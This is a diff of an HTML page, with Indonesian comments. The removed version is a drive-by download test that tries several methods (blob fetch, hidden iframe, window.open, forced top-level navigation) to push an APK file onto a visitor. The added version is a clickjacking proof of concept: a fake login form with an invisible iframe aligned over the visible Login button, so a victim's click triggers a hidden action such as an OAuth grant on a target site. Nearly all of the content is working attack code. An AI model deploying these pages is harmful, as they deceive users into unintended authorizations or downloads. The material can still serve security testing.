@@ -1,123 +1,71 @@
-<html>
+<!DOCTYPE html>
+<html lang="id">
 <head>
-<meta charset="utf-8">
-<title>Drive-By Download Test</title>
+<meta charset="UTF-8">
+<title>Halaman Login — Pusat Layanan</title>
 <style>
-.button {
-  background-color: #4CAF50;
-  border: none;
-  color: white;
-  padding: 15px 32px;
-  text-align: center;
-  text-decoration: none;
-  display: inline-block;
-  font-size: 16px;
-  margin: 4px 2px;
-  cursor: pointer;
-}
-#log { font-family: monospace; white-space: pre; margin-top: 16px; color: #333; }
+  body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; }
+  .wrap { max-width: 360px; margin: 60px auto; background: #fff; padding: 24px;
+          border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,.15); }
+  h1 { font-size: 18px; text-align: center; }
+  input[type=text], input[type=password] {
+    width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc;
+    border-radius: 4px; box-sizing: border-box;
+  }
+  .btn {
+    width: 100%; padding: 10px; margin-top: 8px; background: #1a73e8;
+    color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px;
+  }
+  /* ===== Teknik spoofing CWE-1021 =====
+     1) Layer iframe transparan diposisikan di atas tombol.
+     2) Konten iframe digeser (negative offset) agar tombol "Ya, beri izin"
+        pada halaman target persis menutupi tombol "Login" yang terlihat.
+     3) opacity 0 → aksi korban diarahkan ke aksi tersembunyi. */
+  .overlay {
+    position: absolute; opacity: 0.0;   /* ubah ke 0.1 untuk debug visual */
+    width: 300px; height: 220px; border: none; z-index: 10;
+  }
+  #hiddenFrame { top: 158px; left: calc(50% - 150px); }
 </style>
 </head>
 <body>
-<center>
-<input type="button" class="button" value="Download From Original Site" onclick="a()">
-<div id="log"></div>
-</center>
+<div class="wrap" style="position: relative;">
+  <h1>🔐 Masuk ke Akun Anda</h1>
+  <input type="text" placeholder="Email" autocomplete="off">
+  <input type="password" placeholder="Kata sandi" autocomplete="off">
+
+  <!-- Tombol yang TERLIHAT oleh korban -->
+  <button class="btn" tabindex="-1">Login</button>
+
+  <!-- Layer tersembunyi: halaman target berisi aksi berbahaya.
+       Ganti TARGET_URL dengan halaman konfirmasi pada aset yang diuji,
+       mis. https://target-anda.test/settings/oauth-grant.html
+       Sesuaikan offset top/left agar tombol konfirmasi target
+       sejajar persis di atas tombol "Login". -->
+  <iframe id="hiddenFrame" class="overlay"
+          src="TARGET_URL"
+          sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
+</div>
 
 <script>
-var URL = 'https://github.com/RezaAS14/test.apk';
-var NAME = 'test.apk';
-var log = document.getElementById('log');
+  // Dinamis: pasang offset klik terhadap tombol terlihat (scroll-safe)
+  const btn   = document.querySelector('.btn');
+  const frame = document.getElementById('hiddenFrame');
+  function align() {
+    const r = btn.getBoundingClientRect();
+    frame.style.top    = (r.top + window.scrollY + r.height/2 - 110) + 'px';
+    frame.style.left   = (r.left + r.width/2  - 150) + 'px';
+  }
+  align();
+  window.addEventListener('resize', align);
+  window.addEventListener('scroll', align);
 
-function writeLog(msg) {
-    log.textContent += '[*] ' + msg + '\n';
-    console.log('[test] ' + msg);
-}
-
-// ===== Layer 1: Fetch + Blob (same-origin object, paling andal) =====
-async function tryBlob() {
-    try {
-        const resp = await fetch(URL, { mode: 'cors' });
-        if (!resp.ok) throw new Error('HTTP ' + resp.status);
-        const blob = await resp.blob();
-        const a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = NAME;
-        document.body.appendChild(a);
-        a.click();
-        a.remove();
-        writeLog('Layer 1 (Blob): OK');
-        return true;
-    } catch (e) {
-        writeLog('Layer 1 (Blob) gagal: ' + e.message);
-        return false;
-    }
-}
-
-// ===== Layer 2: Iframe tersembunyi =====
-function tryIframe() {
-    try {
-        var f = document.createElement('iframe');
-        f.style.display = 'none';
-        f.src = URL;
-        document.body.appendChild(f);
-        writeLog('Layer 2 (iframe): dikirim');
-        return true;
-    } catch (e) {
-        writeLog('Layer 2 (iframe) gagal: ' + e.message);
-        return false;
-    }
-}
-
-// ===== Layer 3: window.open dari user gesture (Firefox-friendly) =====
-function tryWindowOpen() {
-    try {
-        var w = window.open(URL, '_blank');
-        if (w) {
-            writeLog('Layer 3 (window.open): OK');
-            return true;
-        }
-        writeLog('Layer 3 (window.open): diblokir');
-        return false;
-    } catch (e) {
-        writeLog('Layer 3 gagal: ' + e.message);
-        return false;
-    }
-}
-
-// ===== Layer 4: Top-level navigation (tidak bisa diblokir) =====
-function tryTopNav() {
-    writeLog('Layer 4 (top-level nav): dieksekusi');
-    window.top.location.href = URL;
-}
-
-// ===== Deteksi browser =====
-function isFirefox() {
-    return navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
-}
-
-// ===== Orchestrator: jalankan berurutan sampai satu sukses =====
-function a() {
-    log.textContent = '';
-    writeLog('Browser: ' + (isFirefox() ? 'Firefox' : 'Chrome/Chromium'));
-
-    // Firefox: window.open masih hidup ~5 detik setelah gesture → coba dulu
-    if (isFirefox()) {
-        setTimeout(function () {
-            if (tryWindowOpen()) return;
-            tryBlob().then(function (ok) { if (!ok) tryIframe(); });
-        }, 0);
-    } else {
-        // Chrome: gesture sangat pendek → Blob/iframe, tanpa delay
-        tryBlob().then(function (ok) {
-            if (!ok) {
-                if (tryIframe()) return;
-                setTimeout(tryWindowOpen, 0); // masih dalam call stack gesture
-                setTimeout(tryTopNav, 3000);  // fallback terakhir
-            }
-        });
-    }
-}
+  // Tandai saat aksi korban tertangkap layer (untuk log pengujian)
+  frame.addEventListener('load', () => {
+    try { frame.contentWindow.addEventListener('click',
+      e => console.log('[POC] Klik korban diarahkan ke target:', e.clientX, e.clientY));
+    } catch (err) { /* cross-origin: cek log di sisi target */ }
+  });
 </script>
 </body>
 </html>
